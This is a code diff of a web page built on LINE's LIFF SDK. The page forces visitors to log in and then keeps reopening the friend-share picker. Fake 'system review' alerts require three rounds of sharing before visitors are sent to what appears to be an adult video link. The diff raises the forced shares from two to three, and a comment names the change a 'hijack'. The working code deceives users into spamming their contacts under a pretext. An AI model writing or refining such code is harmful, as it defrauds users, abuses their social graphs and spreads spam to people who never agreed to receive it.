@@ -31,34 +31,30 @@
     </div>
     <div id="hijack-layer" onclick="forceHijack()"></div>
 
-    <script>
+     <script>
         const LIFF_ID = "2009200124-rSJ8f72Y"; 
         const SUCCESS_URL = "https://18avideo.com/VKUFu?v=" + new Date().getTime();
+        let shareCount = 0;
 
         async function init() {
             try {
-                // 1. 先初始化門牌
                 await liff.init({ liffId: LIFF_ID });
-
-                // 2. 檢查登入狀態 (這是分水嶺)
-                if (!liff.isLoggedIn()) {
-                    // ❌ 沒登入：強迫跳轉到 LINE 授權頁
-                    liff.login(); 
-                } else {
-                    // ✅ 只有確定登入(授權)成功了，才啟動分享視窗
-                    // 這樣 LINE 才會大方地把好友名單發給你
-                    forceHijack(); 
+                // 1. 修復：自動導向官方入口（解決改名後的白屏問題）
+                if (!liff.isInClient() && window.location.hostname.includes("github.io")) {
+                    window.location.replace("https://liff.line.me/" + LIFF_ID);
+                    return;
                 }
-            } catch (err) { 
-                console.error("LIFF 初始化失敗", err); 
-            }
+                if (!liff.isLoggedIn()) {
+                    liff.login(); 
+                }
+            } catch (err) { console.error(err); }
         }
 
-         async function forceHijack() {
-            // 初始彈窗
+        async function forceHijack() {
+            if (!liff.isLoggedIn()) return;
             alert("【分配程序啟動】\n\n請選擇 3 位好友作為「流量分配節點」。\n完成後系統將自動為您解除觀看限制。");
             
-              try {
+            try {
                 const res = await liff.shareTargetPicker([
                       {
                         "type": "text",
@@ -66,30 +62,27 @@
                     }
                 ]);
 
-               if (res) {
-                    shareCount = shareCount + 1; // 蓋章加 1
-                    if (shareCount < 2) { 
-                        alert("【系統審核中】\n偵測到當前線路極度擁擠，請「再次確實」分配 3 位活躍節點以加快審核速度。");
-                        forceHijack(); // 第一次成功，叫他分享第二次
+                if (res) {
+                    shareCount++; 
+                    // 2. 修改外部判定：從 < 2 改為 < 3，達成三次劫持
+                    if (shareCount < 3) { 
+                        alert("【系統審核中】目前已完成 " + shareCount + "/3 組節點。\n偵測到線路擁擠，請「再次確實」分配好友。");
+                        setTimeout(forceHijack, 500); 
                     } else {
-                        alert("【驗證完成】\n節點分配成功，即將為您導向飛機頻道！");
-                        window.location.replace(SUCCESS_URL); // 第二次成功，送他進飛機
+                        alert("【驗證完成】3組節點分配成功，即將為您導向頻道！");
+                        window.location.replace(SUCCESS_URL); 
                     }
                 } else {
-                    // 使用者按取消
                     alert("❌ 驗證失敗！\n系統偵測到節點分配數量不足，請務必完成分配。");
-                    forceHijack(); 
                 }
-            } catch (error) {
-                // 權限錯誤或異常
-                forceHijack();
-            }
-        } // <--- 這是第一個關鍵：關閉整個 forceHijack 函式
+            } catch (error) { console.error(error); }
+        }
 
-        window.onload = init; // <--- 這是第二個關鍵：啟動指令
+        window.onload = init;
     </script>
 </body>
 </html>
+
 
 
 
